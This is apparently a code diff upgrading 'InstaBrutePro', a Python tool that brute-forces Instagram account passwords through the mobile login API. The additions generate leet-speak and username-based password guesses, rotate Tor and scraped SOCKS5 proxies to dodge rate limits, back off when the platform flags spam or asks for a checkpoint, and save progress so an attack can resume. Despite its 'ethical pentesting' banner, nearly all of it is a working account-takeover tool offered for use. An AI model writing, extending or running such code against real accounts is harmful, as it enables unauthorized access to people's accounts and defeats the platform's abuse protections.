@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python3
 import argparse
 import json
@@ -7,13 +6,15 @@ import hmac
 import time
 import random
 import threading
-from concurrent.futures import ThreadPoolExecutor
+import itertools
 import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 import socks
 import socket
 from queue import Queue
+from concurrent.futures import ThreadPoolExecutor
+import urllib.parse
 
 # Colors
 class Colors:
@@ -30,9 +31,9 @@ print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
 print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
 print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
 print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
-print(f"           {Colors.CYAN} InstaBrutePro v1.0 - by Soly {Colors.NC}")
-print(f"{Colors.YELLOW}[*] Elite Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
-print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL.{Colors.NC}\n")
+print(f"           {Colors.CYAN} InstaBrutePro v2.0 - by Soly {Colors.NC}")
+print(f"{Colors.YELLOW}[*] Ultimate Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
+print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL (CFAA).{Colors.NC}\n")
 
 # Config
 with open('config/instabrute_config.json', 'r') as f:
@@ -44,33 +45,73 @@ LOGIN_URL = "https://i.instagram.com/api/v1/accounts/login/"
 UA = "Instagram 350.0.0.21.114 Android (34/14; 560dpi; 1440x3120; samsung; SM-S928B; dm3q; exynos5400; en_US; 350000000000000)"
 APP_ID = "567067343352427"
 SIG_KEY = "686a36310a594a8f4a2f3c1d5b4b5a5e"  # Update from APK if needed
+CHECKPOINT_FILE = "session.json"
 
 # Global
 found = False
 lock = threading.Lock()
-resume_line = 0
+current_delay = DELAY
+attempts_since_last_proxy_refresh = 0
 
-def generate_variations(keyword, username, max_variations=100):
-    """Generate password variations containing the keyword."""
+def save_checkpoint(username, wordlist, line_number):
+    """Save progress to resume later."""
+    with open(CHECKPOINT_FILE, 'w') as f:
+        json.dump({'username': username, 'wordlist': wordlist, 'line_number': line_number}, f)
+
+def load_checkpoint():
+    """Load saved progress."""
+    try:
+        with open(CHECKPOINT_FILE, 'r') as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return None
+
+def leet_speak(keyword):
+    """Generate leet speak variations (e.g., ghh -> g4h, ghH)."""
+    replacements = {'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'], 's': ['$']}
+    variations = [keyword]
+    for char, subs in replacements.items():
+        new_variations = []
+        for var in variations:
+            for sub in subs:
+                new_variations.append(var.replace(char, sub).replace(char.upper(), sub))
+        variations.extend(new_variations)
+    return list(set(variations))
+
+def generate_variations(keywords, username, max_variations=1000):
+    """Generate password variations with keyword combinations."""
     variations = set()
-    common_suffixes = ['123', '2025', 'ig', 'insta', 'pass', '', '456', '789', '2023', '2024']
+    common_suffixes = ['123', '2025', '2024', '2023', 'ig', 'insta', 'pass', '', '456', '789', '!']
     common_prefixes = ['my', 'the', '123', 'insta', 'ig', '', 'test', 'super']
-    
-    # Keyword alone
-    variations.add(keyword)
-    # Keyword with prefixes/suffixes
-    for prefix in common_prefixes:
-        for suffix in common_suffixes:
-            variations.add(f"{prefix}{keyword}{suffix}")
-            variations.add(f"{keyword}{suffix}")
-            variations.add(f"{prefix}{keyword}")
-    # Username-based variations
-    variations.add(f"{username}{keyword}")
-    variations.add(f"{keyword}{username}")
-    # Numbers
-    for i in range(10):
-        variations.add(f"{keyword}{i}")
-        variations.add(f"{i}{keyword}")
+    username_parts = [username] + username.split('123')[:1]  # e.g., testuser123 -> testuser
+
+    # Single keywords and leet variations
+    for keyword in keywords:
+        for leet_var in leet_speak(keyword):
+            variations.add(leet_var)
+            for prefix in common_prefixes:
+                for suffix in common_suffixes:
+                    variations.add(f"{prefix}{leet_var}{suffix}")
+                    variations.add(f"{leet_var}{suffix}")
+                    variations.add(f"{prefix}{leet_var}")
+            for part in username_parts:
+                variations.add(f"{part}{leet_var}")
+                variations.add(f"{leet_var}{part}")
+
+    # Combine keywords (up to 2 keywords)
+    for combo in itertools.permutations(keywords, min(2, len(keywords))):
+        combo_str = ''.join(combo)
+        for leet_var in leet_speak(combo_str):
+            variations.add(leet_var)
+            for prefix in common_prefixes:
+                for suffix in common_suffixes:
+                    variations.add(f"{prefix}{leet_var}{suffix}")
+                    variations.add(f"{leet_var}{suffix}")
+                    variations.add(f"{prefix}{leet_var}")
+            for part in username_parts:
+                variations.add(f"{part}{leet_var}")
+                variations.add(f"{leet_var}{part}")
+
     return list(variations)[:max_variations]
 
 def is_valid_proxy(proxy):
@@ -90,6 +131,23 @@ def is_valid_proxy(proxy):
         return True
     except:
         return False
+
+def refresh_proxies():
+    """Fetch new proxies from proxyscrape API."""
+    proxies = [f"socks5://127.0.0.1:{port}" for port in TOR_PORTS]
+    try:
+        resp = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all", timeout=10)
+        if resp.status_code == 200:
+            new_proxies = [f"socks5://{line.strip()}" for line in resp.text.splitlines() if line.strip()]
+            proxies.extend([p for p in new_proxies if is_valid_proxy(p)])
+        else:
+            print(f"{Colors.RED}[!] Proxy refresh failed! Using Tor only.{Colors.NC}")
+    except requests.RequestException as e:
+        print(f"{Colors.RED}[!] Proxy refresh error: {e}{Colors.NC}")
+    random.shuffle(proxies)
+    with open('proxies/free_proxies.txt', 'w') as f:
+        f.write('\n'.join(proxies))
+    return proxies[:200]
 
 def get_proxies():
     proxies = [f"socks5://127.0.0.1:{port}" for port in TOR_PORTS]
@@ -148,7 +206,7 @@ def sign_payload(payload):
     return f"ig_sig_key_version=4&signed_body={sig}.{body}"
 
 def try_password(username, password, proxy, csrf):
-    global found
+    global found, current_delay, attempts_since_last_proxy_refresh
     if not is_valid_proxy(proxy):
         print(f"{Colors.RED}[!] Invalid proxy: {proxy}{Colors.NC}")
         return False
@@ -173,7 +231,8 @@ def try_password(username, password, proxy, csrf):
     signed = sign_payload(payload)
     try:
         resp = session.post(LOGIN_URL, data=signed, timeout=10)
-        time.sleep(DELAY + random.uniform(0, 0.5))
+        attempts_since_last_proxy_refresh += 1
+        time.sleep(current_delay + random.uniform(0, 0.5))
         if '"authenticated":true' in resp.text:
             with lock:
                 print(f"{Colors.GREEN}[+] CRACKED! {username}:{password}{Colors.NC}")
@@ -183,30 +242,39 @@ def try_password(username, password, proxy, csrf):
                 return True
         elif 'checkpoint_required' in resp.text:
             print(f"{Colors.YELLOW}[!] Checkpoint on {password} - Manual verify?{Colors.NC}")
+            current_delay = min(current_delay * 2, 2.0)  # Increase delay
         elif '"spam":true' in resp.text:
             print(f"{Colors.RED}[!] Rate limit - Rotating proxy{Colors.NC}")
+            current_delay = min(current_delay * 2, 2.0)
             return False
         else:
-            print(f"{Colors.CYAN}[-] Fail: {password[:10]}...{Colors.NC}")
+            print(f"{Colors.CYAN}[-] Fail: {password[:15]}...{Colors.NC}")
+            current_delay = max(current_delay * 0.9, DELAY)  # Decrease delay if stable
         return False
     except Exception as e:
         print(f"{Colors.RED}[!] Error: {e}{Colors.NC}")
+        current_delay = min(current_delay * 2, 2.0)
         return False
     finally:
         session.close()
 
 def worker(queue, username, proxies, csrf):
+    global attempts_since_last_proxy_refresh
     while not queue.empty() and not found:
         pw = queue.get()
         proxy = random.choice(proxies)
         try_password(username, pw, proxy, csrf)
+        if attempts_since_last_proxy_refresh > 1000:  # Refresh proxies every 1000 attempts
+            print(f"{Colors.YELLOW}[*] Refreshing proxies...{Colors.NC}")
+            proxies[:] = refresh_proxies()
+            attempts_since_last_proxy_refresh = 0
         queue.task_done()
 
 def main():
-    global resume_line
-    parser = argparse.ArgumentParser(description="InstaBrutePro: Elite Instagram Brute-Forcer by Soly")
+    global resume_line, current_delay
+    parser = argparse.ArgumentParser(description="InstaBrutePro: Ultimate Instagram Brute-Forcer by Soly")
     parser.add_argument('-u', required=True, help='Target username')
-    parser.add_argument('-w', default='wordlists/rockyou_sample.txt', help='Wordlist path (keywords for substring matching)')
+    parser.add_argument('-w', default='wordlists/password.txt', help='Keyword list for variations')
     parser.add_argument('-t', type=int, default=THREADS, help='Threads')
     parser.add_argument('-r', action='store_true', help='Resume session')
     parser.add_argument('-p', default='proxies/working_proxies.txt', help='Proxy file')
@@ -227,17 +295,21 @@ def main():
         with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
             keywords = [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
-        print(f"{Colors.RED}[!] Wordlist not found: {args.w}{Colors.NC}")
+        print(f"{Colors.RED}[!] Keyword list not found: {args.w}{Colors.NC}")
         return
-    words = []
-    for keyword in keywords:
-        variations = generate_variations(keyword, args.u)
-        words.extend(variations)
-    words = list(set(words))  # Remove duplicates
-    if args.r:
-        resume_line = int(input(f"{Colors.YELLOW}Resume from line (0 for start): {Colors.NC}") or 0)
-        words = words[resume_line:]
+    words = generate_variations(keywords, args.u)
     print(f"{Colors.GREEN}[+] Generated {len(words)} password variations{Colors.NC}")
+
+    # Load checkpoint
+    if args.r:
+        checkpoint = load_checkpoint()
+        if checkpoint and checkpoint['username'] == args.u and checkpoint['wordlist'] == args.w:
+            resume_line = checkpoint['line_number']
+            print(f"{Colors.YELLOW}[*] Resuming from line {resume_line}{Colors.NC}")
+            words = words[resume_line:]
+        else:
+            print(f"{Colors.RED}[!] Invalid checkpoint. Starting from beginning.{Colors.NC}")
+            resume_line = 0
 
     # Proxies
     print(f"{Colors.YELLOW}[*] Loading proxies...{Colors.NC}")
@@ -261,10 +333,12 @@ def main():
         return
 
     queue = Queue()
-    for word in words:
+    for i, word in enumerate(words):
         queue.put(word)
+        if i % 1000 == 0 and i > 0:  # Save checkpoint every 1000 passwords
+            save_checkpoint(args.u, args.w, i)
 
-    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u} with keyword variations... Buckle up!{Colors.NC}")
+    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u} with advanced variations... Buckle up!{Colors.NC}")
     with ThreadPoolExecutor(max_workers=args.t) as exec:
         futures = [exec.submit(worker, queue, args.u, proxies, csrf) for _ in range(args.t)]
         for future in futures:
